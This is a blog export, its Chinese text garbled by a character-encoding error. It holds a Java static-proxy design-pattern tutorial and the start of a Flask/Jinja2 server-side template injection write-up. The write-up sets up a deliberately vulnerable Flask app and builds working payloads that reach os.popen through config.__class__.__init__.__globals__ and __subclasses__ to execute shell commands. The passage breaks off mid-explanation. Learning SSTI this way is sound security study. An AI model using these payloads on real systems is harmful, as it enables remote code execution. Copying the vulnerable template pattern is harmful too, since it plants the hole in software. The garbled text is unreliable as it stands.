<p>è¿™ä¸ªæ—¶å€™ä¸¤è€…ä¹‹é—´çš„åˆåŒå¾ˆçº¯ç²¹ï¼Œå¦‚æœä¸¤è€…è®¤è¯†ï¼Œå°±ä¸éœ€è¦ä¸­ä»‹ï¼Œç›´æ¥å¯¹æ¥æŠŠæˆ¿å­ç§Ÿå‡ºå»å°±å¾ˆç®€å•å¾ˆå¿«äº†å¯¹å§ï¼Ÿä½†æ˜¯ç°å®å¾€å¾€ä¸æ˜¯è¿™æ ·ï¼Œæ›´å¯èƒ½çš„æ˜¯å¦‚ä¸‹æƒ…å†µï¼š</p>
<ul>
<li>æˆ¿ä¸œå’Œå®¢æˆ·äº’ä¸ç›¸è¯†ï¼Œéœ€è¦ç­¾è®¢å„ç§åˆåŒä¿è¯å¯¹æ–¹ä¸ä¼šåæ‚”</li>
<li>ä¸€ä¸ªå®¢æˆ·è‚¯å®šä¸ä¼šåªçœ‹æˆ¿å­ï¼Œä»–éœ€è¦çœ‹å¤šä¸ªæˆ¿å­æ¥é€‰æ‹©è‡ªå·±å¿ƒä»ªçš„æˆ¿å­</li>
<li>æˆ¿ä¸œä¸å¯èƒ½æ—¶æ—¶åˆ»åˆ»éƒ½å®ˆç€æˆ¿å­ï¼Œç­‰ä¸€ä¸ªä¸€ä¸ªçš„å®¢æˆ·ä¸Šé—¨æ¥çœ‹</li>
</ul>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·çš„éœ€æ±‚å’Œæˆ¿ä¸œçš„å®¢æˆ·éƒ½ç›¸å½“ä¸çº¯ç²¹äº†ï¼Œéœ€è¦ç»è¿‡å¾ˆå¤šæ­¥éª¤æ‰å¯ä»¥è½¬æ¢åˆ°ä½</p>
<p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214714721.png" alt="image-20201109214714721"></p>
<p>åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæ­£æ˜¯ç”±äºè¿™ç§æƒ…å†µçš„å‡ºç°ï¼Œæ‰€ä»¥å‡ºç°äº†æˆ¿å±‹ä¸­ä»‹ï¼Œè§£å†³å„ç§å®¢æˆ·çš„æƒ…å†µï¼Œç”±æˆ¿å±‹ä¸­ä»‹æ¥ç»™å®¢æˆ·ä»¬è§£å†³å„ç§é—®é¢˜ï¼Œç»è¿‡ä¸­ä»‹å¤„ç†ï¼ŒåŒæ–¹çš„æƒ…å†µåˆå˜å¾—çº¯ç²¹äº†èµ·æ¥ï¼Œè€Œç¹ççš„äº‹æƒ…äº¤ç»™ä¸­ä»‹æ¥å¤„ç†å³å¯</p>
<p><img src="image-20201109214848811.png" alt="image-20201109214848811"></p>
<p>è€Œä»£ç ä¸€æ ·å¦‚æ­¤ï¼Œè¿™ç§æƒ…å†µçš„å‡ºç°å‡ ä¹å¤„å¤„å¯è§ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯èƒ½éœ€è¦å¤„ç†æ•°æ®åº“ï¼Œä¸­é—´éœ€è¦å¯¹æ•°æ®è¿›è¡Œå„ç§å¤„ç†ï¼Œè¿™ç§æƒ…å†µå°±å’Œä¸Šé¢çš„åˆåŒä¸€æ ·ã€‚</p>
<p>è¯è¯´å›æ¥ï¼Œæˆ‘ä»¬å¦‚ä½•å¤„ç†ç§Ÿæˆ¿å­çš„æƒ…å†µå‘¢ï¼Ÿè¿™é‡Œæˆ‘å†™äº†ä¸€å°æ®µä»£ç æ¥åšå‡ºèŒƒä¾‹ï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªäº‹æƒ…æŠ½è±¡æˆå››ä¸ªpartï¼š</p>
<ul>
<li>å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ…</li>
<li>è°å‡ºç§Ÿï¼Ÿ æˆ¿ä¸œ</li>
<li>è°è¦æˆ¿å­ï¼Ÿ å®¢æˆ·</li>
<li>è°æ¥å¤„ç†å¤æ‚æƒ…å†µï¼Ÿ ä¸­ä»‹</li>
</ul>
<p>åˆ†æå®Œä¹‹åæˆ‘ä»¬å¯ä»¥ç€æ‰‹äºä»£ç </p>
<p>å‡ºç§Ÿæˆ¿å­è¿™ä»¶äº‹æƒ…ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ¿ä¸œ:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> <span class="keyword">implements</span> <span class="title">Rent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ¿ä¸œç§Ÿå‡ºæˆ¿å­&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸­ä»‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProxy</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyProxy</span><span class="params">(Host host)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        host.rent();</span><br><span class="line">        takeMoney();</span><br><span class="line">        giveMoney();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">seeHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿å­&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">takeMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸­ä»‹æ”¶ä½ é’±&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">giveMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¸­ä»‹ç»™é’±ç»™æˆ¿ä¸œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        MyProxy proxy = <span class="keyword">new</span> MyProxy(<span class="keyword">new</span> Host());</span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åœ¨ä¸Šé¢çš„ä¾‹å­å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œé™æ€ä»£ç†å¸®æˆ‘ä»¬å®Œæˆäº†å¦‚ä¸‹äº‹æƒ…ï¼š</p>
<ol>
<li>ä½¿å¾—éœ€è¦å†æ¬¡æ˜ç¡®èµ·æ¥ï¼Œæ— è®ºæ˜¯å®¢æˆ·è¿˜æ˜¯æˆ¿ä¸œï¼Œéœ€æ±‚éƒ½å˜å¾—ç›¸å½“ç®€å•</li>
<li>å¤æ‚çš„äº‹æƒ…äº¤ç»™äº†ä¸­ä»‹æ¥åš</li>
</ol>
<p>ä½†æ˜¯æˆ‘ä»¬ä¹Ÿå‘ç°äº†ä¸€ä¸ªç¼ºç‚¹ï¼š</p>
<ol>
<li>æˆ‘ä»¬çš„ä»£ç é‡æ˜æ˜¾æå‡äº†å¾ˆå¤šï¼Œç›¸æ¯”äºç›´æ¥æ·»åŠ åŠŸèƒ½</li>
<li>é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœå®¢æˆ·å¾ˆå¤šï¼Œæˆ‘ä»¬ä¸å¾—ä¸æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªä¸ªå®¢æˆ·ï¼Œå·¥ä½œé‡æ›´å¤§äº†ã€‚</li>
</ol>
<h2 id="ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£"><a href="#ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£" class="headerlink" title="ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£"></a>ç»“åˆå¢åˆ æ”¹æŸ¥äº‹åŠ¡ç†è§£</h2><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å­¦ä¹ åˆ°äº†ä»£ç†æ¨¡å¼çš„ç¬¬ä¸€ä¸ªå¥½å¤„ï¼Œæ¥ä¸‹çš„ä¾‹å­å°†è¿›ä¸€æ­¥è¡¨éœ²å‡ºä¸Šé¢çš„è®¾è®¡æ¨¡å¼çš„å¥½å¤„ï¼Œå¹¶ä¸”å®ƒä¼šå±•ç°é™æ€ä»£ç†çš„ç¬¬äºŒä¸ªå¥½å¤„ï¼Œ<strong>æ·»åŠ æ–°åŠŸèƒ½è€Œä¸ä¿®æ”¹åŸæœ‰ä»£ç </strong></p>
<p>å¢åˆ æ”¹æŸ¥äº‹åŠ¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸šåŠ¡å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™æˆ‘ä»¬çªç„¶æƒ³è¦æ·»åŠ æ–°åŠŸèƒ½ï¼Œæ‰“å°æˆ‘ä»¬ä½¿ç”¨äº†ä»€ä¹ˆåŠŸèƒ½æ”¹æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¾ˆæ˜æ˜¾å¯ä»¥è¿™æ ·åšï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;ä½¿ç”¨äº†æŸ¥è¯¢åŠŸèƒ½&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ç§æ–¹å¼éå¸¸ç¬¨æ‹™ï¼Œå¹¶ä¸”å¦‚æœæ˜¯æ›´å¤šçš„åŠŸèƒ½ï¼Œç¨‹åºå‘˜å°±å¿…é¡»æ‰‹å†™ï¼Œå¹¶ä¸”ä¸€æ®µä¸€æ®µçš„å¤åˆ¶å·®ä¸å¤šçš„ä»£ç ï¼ï¼ˆè¿™é‡Œå››ä¸ªè¾“å‡ºè¯­å¥å°±è®©æˆ‘æ„Ÿè§‰æœ‰ç‚¹çƒ¦èºäº†</p>
<p>æˆ‘ä»¬ç»“åˆä»£ç†æ¨¡å¼ï¼Œå…¶å®å¯ä»¥å¾ˆä¼˜é›…çš„è§£å†³å®ƒï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;åˆ é™¤&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æ›´æ–°&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æŸ¥è¯¢&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]æ‰§è¡Œäº†&quot;</span>+name+<span class="string">&quot;æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™æˆ‘ä»¬å°±è§£å†³äº†åŠŸèƒ½çš„éœ€æ±‚ï¼Œå¹¶ä¸”ï¼Œ<strong>æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹ä»»ä½•ä¸€è¡ŒåŸä»£ç </strong>ï¼Œå´ä¸Šçº¿äº†æ–°çš„åŠŸèƒ½ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬çš„ä»£ç æ‹“å±•æ€§ä¾ç„¶å¾ˆé«˜ï¼Œéœ€è¦æ·»åŠ æ–°åŠŸèƒ½åªéœ€è¦æ·»åŠ æ–°çš„ä»£ç†å±‚å³å¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°†å¼•å‡ºäº†ç¬¬ä¸‰ä¸ªæ€æƒ³ï¼š</p>
<p><strong>ä»»ä½•åŠŸèƒ½çš„æ·»åŠ ï¼Œä¿®æ”¹ï¼Œå¼•å…¥æ–°çš„ä»£ç†å±‚æ¥è§£å†³ï¼Œå®¢æˆ·åªéœ€è¦å»å¯¼å…¥æœ€åä¸€ä¸ªä»£ç†å¢å³å¯</strong></p>
]]></content>
      <tags>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>FlaskSSti</title>
    <url>/2020/10/27/FlaskSSti/</url>
    <content><![CDATA[<p>ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš</p>
<a id="more"></a>

<h1 id="1-hackbar-è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„"><a href="#1-hackbar-è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„" class="headerlink" title="1.hackbar è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„"></a>1.hackbar è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„</h1><p>ç¬¬ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯æ­å»ºæˆ‘ä»¬çš„ç¯å¢ƒï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27;</span> % (<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ç§å°±æ˜¯æœ€åŸºæœ¬çš„flaskï¼Œåœ¨flaskå½“ä¸­jinjiaçš„æ¨¡æ¿ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªèŠ±æ‹¬å·å°±å¯ä»¥å…è®¸ä¸€äº›åŸºæœ¬çš„è¿ç®— ç”¨äºæ‰§è¡Œifï¼Œforå¾ªç¯ç­‰ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ä¸ªæœ€åŸºæœ¬çš„payloadçš„æ„é€ æ–¹å¼æ˜¯è¯¥æ€ä¹ˆè§¦å‘å‘¢ï¼Ÿç¬¬ä¸€æ­¥ï¼Œä»configç±»è§¦å‘ï¼Œå› ä¸ºFlaské‡Œé¢è‡ªå¸¦</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026173228975.png" alt="image-20201026173228975"></p>
<p>é€šè¿‡è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„flaskçš„config~ï¼Œè€Œè¿™ä¸€çš„æ„ä¹‰å¥½åƒä¸æ˜¯å¾ˆå¤§ï¼Ÿæˆ‘ä»¬å¾—ä¸åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªä½œä¸ºè·³æ¿ï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__class__.__init__</span><br></pre></td></tr></table></figure>

<p>__classæ–¹æ³•å±æ€§çš„æ—¶å€™ä¼šåªæƒ³è¯¥å®ä¾‹å¯¹åº”çš„ç±»ï¼Œæ­¤æ—¶configçš„ç±»æ˜¯Config,ç„¶åå¯ä»¥å†å»è°ƒç”¨å…¶å®ƒç±»å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬å®¡è®¡äº†æºç ï¼Œå°±å¯ä»¥çŸ¥é“æˆ‘ä»¬æ­¤æ—¶çš„Configç±»ä½äºconfig.py80å¤šè¡Œï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ__init__ä¹‹åï¼Œä¾¿å¯ä»¥åœ¨ä¸‹é¢çš„101è¡Œæ‰¾åˆ°è¿™ä¹ˆä¸€è¡Œä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rv = os.environ.get(variable_name)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„configç±»å½“ä¸­å«æœ‰osåº“çš„æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨æ˜¯ä¸è¡Œçš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡globalså‡½æ•°å…ˆè·å–åˆ°å®ƒï¼Œäºæ˜¯å¾—åˆ°ï¼š</p>
<p><strong>globals()</strong> å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡,åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æˆ‘ä»¬æ‹¼æ¥å¾—åˆ°å¦‚ä¸‹çš„payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config.__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°ï¼š</p>
<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026175828323.png" alt="image-20201026175828323"></p>
<p>æˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼æ¥è·å–osåº“ï¼Œåˆ©ç”¨__dictè¿™ä¸ªæ–¹æ³•æ¥æŸ¥çœ‹osåº“å“ªäº›å¯ä»¥ç»™æˆ‘ä»¬è¿›è¡Œä½¿ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°systemï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨è¯¥æ–¹æ³•å´æ— æ³•å¾—åˆ°å›æ˜¾ï¼Œè¯¥æ–¹æ³•åªä¸è¿‡æ˜¯æˆåŠŸçš„æ—¶å€™è¿”å›1ï¼Œå¤±è´¥äº†åˆ™æ˜¯è¿”å›0</p>
<p>æ‰§è¡Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°1æˆ–è€…0å¯¹äºæˆ‘ä»¬æ¥è¯´æ„ä¹‰ä¸å¤§ï¼Œå½“ç„¶è¿™æ ·ä¹Ÿå¯ä»¥è¿›è¡Œç›²æ³¨ã€ï¼Œè€Œpopenåˆ™å¯ä»¥è¿”å›æ–‡ä»¶å¯¹è±¡</p>
<p><strong>os.popen</strong> </p>
<p>ã€€ã€€è¯¥æ–¹æ³•ä¸ä½†æ‰§è¡Œå‘½ä»¤è¿˜è¿”å›æ‰§è¡Œåçš„ä¿¡æ¯å¯¹è±¡ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªç®¡é“æ–‡ä»¶å°†ç»“æœè¿”å›ã€‚</p>
<p>ã€€ã€€output = os.popen(â€˜cat /proc/cpuinfoâ€™)</p>
<p>ã€€ã€€print output.read()</p>
<p>äºæ˜¯æˆ‘ä»¬æ„é€ æœ€ç»ˆçš„payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;dir()&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-configä»¥å¤–çš„æ€è·¯"><a href="#1-2-configä»¥å¤–çš„æ€è·¯" class="headerlink" title="1.2 configä»¥å¤–çš„æ€è·¯"></a>1.2 configä»¥å¤–çš„æ€è·¯</h2><p>å…¶ä»–çš„ä¸€äº›æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬çš„configè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡()å’Œâ€™â€™åˆ†åˆ«è·å–åˆ°tupleå’Œstrçš„åˆå§‹åŒ–~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__name__  <span class="comment">#å¾—åˆ°str</span></span><br><span class="line">()_.__class__.__name__ <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å¼•å…¥baseå’Œmroçš„é­”æœ¯æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bases : ç±»çš„åŸºç±»çš„å…ƒç»„ï¼Œé¡ºåºä¸ºå®ƒä»¬åœ¨åŸºç±»åˆ—è¡¨ä¸­å‡ºç°çš„é¡ºåºï¼ˆåŸºç±»å°±æ˜¯Objectç±»~ï¼‰</span><br><span class="line">mro :ç±»çš„çˆ¶ç±»ï¼Œä»çˆ¶ç±»ç½‘ä¸Šæ‰¾ï¼Œæœ€ç»ˆä¼šæ‰¾åˆ°åŸºç±»ï¼Œæ‰€ä»¥mro[<span class="number">-1</span>]ç­‰ä»·äº__bases__</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026184448939.png" alt="image-20201026184448939"></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬å°±æƒ³åˆ°çš„ï¼Œæˆ‘ä»¬æ—¢ç„¶å¾—åˆ°äº†åŸºç±»ï¼Œæ˜¯ä¸æ˜¯å°±æƒ³è¦æ‰€æœ‰çš„å­ç±»äº†å‘¢ï¼Ÿæ¯•ç«Ÿå­ç±»çš„å†…å®¹æˆ‘ä»¬æ›´åŠ æ„Ÿå…´è¶£ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°osåº“å¯¹å§ã€‚è€Œpythonæ­£å¥½æ‹¥æœ‰è¿™ä¸ªé­”æœ¯æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__ <span class="comment">#è·å–æ‰€æœ‰çš„å­ç±»æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

